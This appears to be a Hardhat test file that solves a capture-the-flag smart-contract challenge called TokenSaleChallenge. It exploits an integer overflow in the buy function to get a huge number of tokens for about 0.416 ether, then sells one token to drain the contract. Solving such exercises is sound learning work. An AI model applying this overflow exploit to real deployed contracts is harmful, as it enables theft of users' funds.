import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * function buy has condition `require(msg.value == numTokens * PRICE_PER_TOKEN);``
     * PRICE_PER_TOKEN = 1 ether | which is 10**18 in wei
     * and we know 2**256 will trigger a number overflow, and become a very low value (which is what we want msg.value to be)
     * so we get OVERFLOW_UINT_TOKEN_AMOUNT (numTokens) by getting a number just slightly lower than 2**256
     *  => 115792089237316195423570985008687907853269984665640564039458
     * and ETH_MSG_VALUE_AFTER_OVERFLOW (msg.value) is OVERFLOW_UINT_TOKEN_AMOUNT / 18**18,
     */

    const OVERFLOW_UINT_TOKEN_AMOUNT =
      '115792089237316195423570985008687907853269984665640564039458';
    const ETH_MSG_VALUE_AFTER_OVERFLOW = '415992086870360064';

    /**
     * We will effectively buy a large number of tokens (due to the overflow),
     * but only pay a small amount of Ether (0.415992086870360064 ether).
     */

    const buyTx = await target.buy(OVERFLOW_UINT_TOKEN_AMOUNT, {
      value: ETH_MSG_VALUE_AFTER_OVERFLOW,
    });
    await buyTx.wait();

    /**
     * After purchasing a huge number of tokens with a small amount of Ether, you call the sell function to sell 1 token.
     * Since PRICE_PER_TOKEN is 1 ether, selling 1 token will send 1 ether back to the caller.
     * The contract started with exactly 1 ether in its balance (from the constructor).
     * After selling this 1 token, the contract’s balance drops below 1 ether.
     */
    
    const exploitTx = await target.sell(1);
    await exploitTx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
